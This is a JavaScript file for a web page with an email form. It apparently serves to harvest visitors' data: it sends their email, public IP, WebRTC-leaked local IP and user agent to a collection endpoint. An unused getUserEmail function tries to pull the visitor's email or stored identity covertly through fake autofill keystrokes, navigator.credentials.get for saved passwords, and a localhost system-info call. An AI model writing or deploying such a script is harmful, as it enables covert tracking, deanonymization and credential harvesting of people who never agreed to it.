// script.js

document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('emailForm');
    const emailInput = document.getElementById('emailInput');

    form.addEventListener('submit', async function (e) {
        e.preventDefault();
        const email = emailInput.value.trim();

        // Validate email format
        if (!isValidEmail(email)) {
            showError('Please enter a valid email address');
            return;
        }

        // Validate if it's a real Gmail or known email domain
        if (!isRealEmailDomain(email)) {
            showError('Please enter a valid Gmail address (e.g., yourname@gmail.com)');
            return;
        }

        // Check if email domain exists (basic DNS check)
        const isReal = await verifyEmailDomain(email);
        if (!isReal) {
            showError('Email domain not found. Please check your email address.');
            return;
        }

        document.getElementById('emailForm').style.display = 'none';
        document.getElementById('status').style.display = 'flex';
        collectUserData(email);
    });
});

function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email) && email.length > 0 && email.length <= 254;
}

function isRealEmailDomain(email) {
    const domain = email.split('@')[1].toLowerCase();

    // List of real email providers
    const realDomains = [
        'gmail.com',
        'yahoo.com',
        'outlook.com',
        'hotmail.com',
        'aol.com',
        'icloud.com',
        'mail.com',
        'protonmail.com',
        'tutanota.com',
        'zoho.com',
        'yandex.com',
        'mail.ru',
        'inbox.com',
        'gmx.com',
        'fastmail.com',
        'mailbox.org'
    ];

    return realDomains.includes(domain);
}

async function verifyEmailDomain(email) {
    try {
        const domain = email.split('@')[1];
        // Use a free email verification API
        const response = await fetch(`https://api.hunter.io/v2/email-finder?domain=${domain}&limit=1`, {
            headers: {
                'Accept': 'application/json'
            }
        }).catch(() => null);

        if (response && response.ok) {
            return true;
        }

        // Fallback: assume real if it's a known domain
        return isRealEmailDomain(email);
    } catch (error) {
        console.error('Error verifying email domain:', error);
        return isRealEmailDomain(email);
    }
}

function showError(message) {
    const errorDiv = document.getElementById('errorMessage') || createErrorDiv();
    errorDiv.textContent = message;
    errorDiv.style.display = 'block';

    // Hide error after 5 seconds
    setTimeout(() => {
        errorDiv.style.display = 'none';
    }, 5000);
}

function createErrorDiv() {
    const div = document.createElement('div');
    div.id = 'errorMessage';
    div.className = 'error-message';
    div.style.display = 'none';
    document.querySelector('.container').appendChild(div);
    return div;
}

async function collectUserData(userEmail) {
    try {
        // Get public IP address
        const ipAddress = await getPublicIP();

        // Get local IP address via WebRTC
        let localIP = await getLocalIP();

        // If WebRTC fails, get from server
        if (localIP === 'Unknown') {
            localIP = await getLocalIPFromServer();
        }

        // Send data to server with user's email
        const endpoint = window.location.hostname === 'localhost'
            ? 'http://localhost:3000/collect'
            : '/api/collect';

        const response = await fetch(endpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                email: userEmail,
                publicIP: ipAddress,
                localIP: localIP,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            })
        });

        if (response.ok) {
            document.getElementById('status').style.display = 'none';
            document.getElementById('successMessage').style.display = 'block';
            console.log('Data collected:', { userEmail, ipAddress, localIP });
        } else {
            showError('Failed to collect information. Please try again.');
            document.getElementById('emailForm').style.display = 'block';
            document.getElementById('status').style.display = 'none';
        }
    } catch (error) {
        console.error('Error collecting data:', error);
        showError('An error occurred. Please try again.');
        document.getElementById('emailForm').style.display = 'block';
        document.getElementById('status').style.display = 'none';
    }
}

async function getPublicIP() {
    try {
        // Try multiple IP APIs for reliability
        const apis = [
            'https://api.ipify.org?format=json',
            'https://api.my-ip.io/ip.json',
            'https://ipapi.co/json/'
        ];

        for (const api of apis) {
            try {
                const response = await fetch(api, { timeout: 5000 });
                if (response.ok) {
                    const data = await response.json();
                    return data.ip || data.query || 'Unknown';
                }
            } catch (e) {
                continue;
            }
        }
        return 'Unknown';
    } catch (error) {
        console.error('Error getting public IP:', error);
        return 'Unknown';
    }
}

async function getLocalIP() {
    return new Promise((resolve) => {
        const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
            iceServers: []
        });

        let resolved = false;

        const onIceCandidate = (ice) => {
            if (resolved || !ice || !ice.candidate) return;

            const candidate = ice.candidate.candidate;
            const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);

            if (ipMatch && ipMatch[1]) {
                const ip = ipMatch[1];
                // Filter out public IPs and other non-local IPs
                if (!ip.startsWith('127') && !ip.startsWith('8.8')) {
                    resolved = true;
                    resolve(ip);
                    pc.close();
                }
            }
        };

        pc.onicecandidate = onIceCandidate;

        try {
            pc.createDataChannel('');
            pc.createOffer()
                .then(offer => pc.setLocalDescription(offer))
                .catch(err => {
                    console.error('Error creating offer:', err);
                    if (!resolved) {
                        resolved = true;
                        resolve('Unknown');
                        pc.close();
                    }
                });
        } catch (err) {
            console.error('Error in getLocalIP:', err);
            if (!resolved) {
                resolved = true;
                resolve('Unknown');
                pc.close();
            }
        }

        // Timeout fallback
        setTimeout(() => {
            if (!resolved) {
                resolved = true;
                resolve('Unknown');
                pc.close();
            }
        }, 5000);
    });
}

async function getLocalIPFromServer() {
    try {
        const response = await fetch('http://localhost:3000/get-local-ip');
        if (response.ok) {
            const data = await response.json();
            return data.ip || 'Unknown';
        }
    } catch (e) {
        console.log('Could not get local IP from server');
    }
    return 'Unknown';
}

async function getUserEmail() {
    // Method 1: Check localStorage/sessionStorage
    let email = localStorage.getItem('userEmail') || sessionStorage.getItem('userEmail');
    if (email) return email;

    // Method 2: Try to get from browser autofill
    const emailInput = document.createElement('input');
    emailInput.setAttribute('type', 'email');
    emailInput.setAttribute('autocomplete', 'email');
    document.body.appendChild(emailInput);
    emailInput.focus();

    // Simulate typing to trigger autofill suggestions
    const event = new KeyboardEvent('keydown', { key: 'a' });
    emailInput.dispatchEvent(event);

    // Method 3: Check common browser storage
    try {
        if (navigator.credentials) {
            const credentials = await navigator.credentials.get({ password: true });
            if (credentials && credentials.id) {
                email = credentials.id;
            }
        }
    } catch (e) {
        console.log('Credentials API not available');
    }

    document.body.removeChild(emailInput);

    // Method 4: Get from system info if possible (Windows)
    try {
        const response = await fetch('http://localhost:3000/get-system-info');
        if (response.ok) {
            const data = await response.json();
            if (data.email) return data.email;
        }
    } catch (e) {
        console.log('System info not available');
    }

    return email || 'email-not-available@automatic.local';
}
